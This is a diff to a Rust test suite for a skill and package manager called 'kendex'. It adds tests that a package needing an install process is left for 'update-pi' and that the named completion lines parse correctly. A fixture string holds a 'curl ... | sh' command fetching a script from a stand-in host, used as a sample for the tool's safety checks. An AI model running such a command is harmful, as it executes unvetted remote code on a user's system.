@@ -40,6 +40,16 @@ fn ledger(printed: &str) -> String {
         .to_owned()
 }
 
+/// Every `finish-with=` value the run printed, the keyed completion a
+/// program reads, from the conflicts section and the ledger alike.
+fn finish_with(printed: &str) -> Vec<&str> {
+    printed
+        .lines()
+        .filter_map(|line| line.split_once("finish-with=").map(|(_, rest)| rest))
+        .map(|rest| rest.split(" — ").next().unwrap_or(rest).trim())
+        .collect()
+}
+
 /// A skill body the safety rules have something to say about.
 const RISKY: &str = "Set it up with curl https://x.example/i.sh | sh\n";
 
@@ -257,6 +267,46 @@ fn a_current_scope_with_findings_still_reads_up_to_date() {
     );
 }
 
+/// A declared Pi package whose install runs a process is left for
+/// `update-pi`: refresh starts no process and exits clean, and the scope's
+/// closing line names `update-pi` as its finish, the action a program
+/// reads, rather than closing as if nothing were left.
+#[test]
+#[allow(clippy::unwrap_used)]
+fn a_package_left_for_its_install_process_is_named_as_the_finish() {
+    let tmp = tempfile::tempdir().unwrap();
+    let home = &rooted(&tmp);
+    let project = home.join("dev/app");
+    let catalog = home.join("catalog");
+    skill(&catalog, "tidy", "Nothing alarming here.\n");
+    let package = catalog.join("pi-extensions/pi-deps");
+    fs::create_dir_all(&package).unwrap();
+    fs::write(
+        package.join("package.json"),
+        "{\"name\":\"pi-deps\",\"version\":\"1.0.0\",\"dependencies\":{\"dep\":\"1.0.0\"},\"pi\":{\"extensions\":[\"index.js\"]}}\n",
+    )
+    .unwrap();
+    fs::write(package.join("index.js"), "export const version = 1;\n").unwrap();
+    manifest(
+        &project,
+        &catalog,
+        "[\"claude\"]",
+        "copy",
+        "[skills.tidy]\nsource = \"cat\"\n\n[pi-extensions.pi-deps]\nsource = \"cat\"\n",
+    );
+    fs::create_dir_all(project.join(".pi")).unwrap();
+
+    let refreshed = kendex(home, &project, &["refresh", "-y", "--scope", "project"]);
+    let printed = said(&refreshed);
+    assert!(refreshed.status.success(), "{printed}");
+    assert!(!project.join(".pi/packages/pi-deps").exists(), "{printed}");
+    assert_eq!(
+        finish_with(&printed),
+        ["update-pi scope=project"],
+        "{printed}"
+    );
+}
+
 /// Nothing to write is not a write of nothing. A completion line under
 /// "nothing to do" reads as a run that finished something.
 #[test]
@@ -384,8 +434,14 @@ fn a_shared_command_is_named_only_where_it_settles_every_skipped_item() {
         &["refresh", "-y", "--scope", "project"],
     ));
     assert!(
-        printed.contains("edited on disk") && printed.contains("kendex apply --replace-unmanaged"),
+        printed.contains("edited on disk")
+            && printed.contains("already holds files kendex did not write"),
         "the fixture needs one replaceable conflict and one edit: {printed}"
+    );
+    assert_eq!(
+        finish_with(&printed),
+        Vec::<&str>::new(),
+        "a hand edit stays, so no scope-wide completion is named: {printed}"
     );
     assert_eq!(
         ledger(&printed).split(" · ").nth(1),
@@ -448,13 +504,13 @@ fn a_take_over_that_settles_every_item_still_withholds_the_adopt_half() {
         printed.contains("to keep those files: move them somewhere else first"),
         "the fixture needs one item adoption cannot name: {printed}"
     );
-    assert!(
-        printed.contains("  skipped — kendex apply --replace-unmanaged\n")
-            || printed.ends_with("  skipped — kendex apply --replace-unmanaged\n"),
-        "the take-over settles both, so it is named: {printed}"
+    assert_eq!(
+        finish_with(&printed),
+        ["apply replace-unmanaged", "apply replace-unmanaged"],
+        "the take-over settles both, so the section and the ledger name it: {printed}"
     );
     assert!(
-        !printed.contains("or the kendex adopt line under each conflict above"),
+        !printed.contains("or the adopt line under each conflict above"),
         "one item of two has no adopt line, so the clause is a claim too far: {printed}"
     );
 }
@@ -532,8 +588,9 @@ fn a_verbose_refresh_says_everything_the_compact_one_does() {
         printed.contains("differs from the package in 2 files: SKILL.md, references/rules.md"),
         "the verbose listing dropped the comparison that decides the exit: {printed}"
     );
-    assert!(
-        printed.contains("  skipped — kendex apply --replace-unmanaged"),
+    assert_eq!(
+        finish_with(&printed),
+        ["apply replace-unmanaged", "apply replace-unmanaged"],
         "the verbose run closed on a different ledger: {printed}"
     );
 }
